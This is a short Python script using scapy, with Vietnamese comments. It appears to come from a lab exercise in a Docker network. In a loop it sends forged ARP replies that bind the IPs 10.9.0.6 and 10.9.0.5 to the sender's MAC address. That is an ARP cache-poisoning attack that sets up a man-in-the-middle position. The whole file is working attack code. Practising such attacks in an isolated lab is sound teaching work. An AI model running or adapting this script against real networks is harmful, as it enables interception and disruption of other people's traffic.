#!/usr/bin/python3
from scapy.all import *
import time

# Thông tin địa chỉ MAC nguồn
src_mac = '02:42:0a:09:00:69'

# Hàm gửi gói ARP đến một địa chỉ IP nhất định
def send_arp_packet(ip):
    E = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac)
    A = ARP(
        hwtype=1,
        ptype=2048,
        hwlen=6,
        plen=4,
        hwsrc=src_mac,
        psrc=ip,
        hwdst='ff:ff:ff:ff:ff:ff',
        pdst=ip
    )
    A.op = 2  # ARP reply

    pkt = E/A
    pkt.show()
    sendp(pkt)

# Gửi gói ARP đến hai địa chỉ IP mỗi 5 giây
while True:
    send_arp_packet('10.9.0.6')
    send_arp_packet('10.9.0.5')
    time.sleep(5)
